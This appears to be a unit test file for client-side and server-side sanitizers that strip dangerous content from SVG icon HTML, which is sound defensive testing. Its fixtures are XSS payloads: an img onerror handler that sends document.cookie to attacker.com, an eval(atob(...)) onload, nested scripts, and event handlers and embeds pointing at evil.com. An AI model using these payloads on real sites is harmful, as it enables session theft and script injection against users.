import { sanitizeIconHtml, serverSanitizeIconHtml } from "./sanitizeIconHtml";

describe("sanitizeIconHtml (client-side, DOMPurify)", () => {
    it("strips onerror from img tags", () => {
        const input = `<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>`;
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("onerror");
    });

    it("strips onload from svg tags", () => {
        const input = `<svg onload=eval(atob("YWxlcnQoMSk="))></svg>`;
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("onload");
        expect(result).toContain("<svg");
    });

    it("removes script tags entirely", () => {
        const input = "<script>alert(1)</script>";
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("script");
        expect(result).not.toContain("alert");
    });

    it("removes foreignObject and nested scripts", () => {
        const input = `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`;
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("foreignObject");
        expect(result).not.toContain("script");
    });

    it("preserves legitimate SVG content", () => {
        const input = `<svg viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2z"/></svg>`;
        const result = sanitizeIconHtml(input);
        expect(result).toContain("<svg");
        expect(result).toContain("<path");
        expect(result).toContain("viewBox");
    });

    it("strips xlink:href attribute", () => {
        const input = `<svg><use xlink:href="https://evil.com/payload"></use></svg>`;
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("xlink:href");
    });

    it("strips animation elements", () => {
        const input = `<svg><animate attributeName="x" values="0;100" dur="1s" onbegin="alert(1)"/></svg>`;
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("animate");
        expect(result).not.toContain("onbegin");
    });

    it("returns empty string for non-SVG HTML", () => {
        const input = `<div><iframe src="https://evil.com"></iframe></div>`;
        const result = sanitizeIconHtml(input);
        expect(result).not.toContain("iframe");
    });
});

describe("serverSanitizeIconHtml (server-side, regex-based)", () => {
    it("strips onerror from img tags", () => {
        const input = `<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("onerror");
    });

    it("strips onload from svg tags", () => {
        const input = `<svg onload=eval(atob("YWxlcnQoMSk="))></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("onload");
        expect(result).toContain("<svg");
    });

    it("strips quoted event handlers", () => {
        const input = `<svg onload="alert(1)"></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("onload");
        expect(result).toContain("<svg");
    });

    it("strips single-quoted event handlers", () => {
        const input = `<svg onload='alert(1)'></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("onload");
        expect(result).toContain("<svg");
    });

    it("removes script tags entirely", () => {
        const input = "<script>alert(1)</script>";
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("script");
        expect(result).not.toContain("alert");
    });

    it("removes foreignObject and nested scripts", () => {
        const input = `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("foreignObject");
        expect(result).not.toContain("script");
    });

    it("preserves legitimate SVG content", () => {
        const input = `<svg viewBox="0 0 24 24"><path d="M12 2L2 22h20L12 2z"/></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).toContain("<svg");
        expect(result).toContain("<path");
        expect(result).toContain("viewBox");
    });

    it("strips xlink:href attribute", () => {
        const input = `<svg><use xlink:href="https://evil.com/payload"></use></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("xlink:href");
    });

    it("strips animation elements", () => {
        const input = `<svg><animate attributeName="x" values="0;100" dur="1s" onbegin="alert(1)"/></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("animate");
        expect(result).not.toContain("onbegin");
    });

    it("removes iframe tags", () => {
        const input = `<div><iframe src="https://evil.com"></iframe></div>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("iframe");
    });

    it("removes img tags used for XSS", () => {
        const input = `<img src=x onerror="alert(1)">`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("img");
        expect(result).not.toContain("onerror");
    });

    it("removes object and embed tags", () => {
        const input = `<svg><object data="https://evil.com"></object><embed src="https://evil.com"></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("object");
        expect(result).not.toContain("embed");
    });

    it("handles multiple event handlers on the same element", () => {
        const input = `<svg onload="alert(1)" onmouseover="alert(2)" onclick="alert(3)"></svg>`;
        const result = serverSanitizeIconHtml(input);
        expect(result).not.toContain("onload");
        expect(result).not.toContain("onmouseover");
        expect(result).not.toContain("onclick");
        expect(result).toContain("<svg");
    });
});
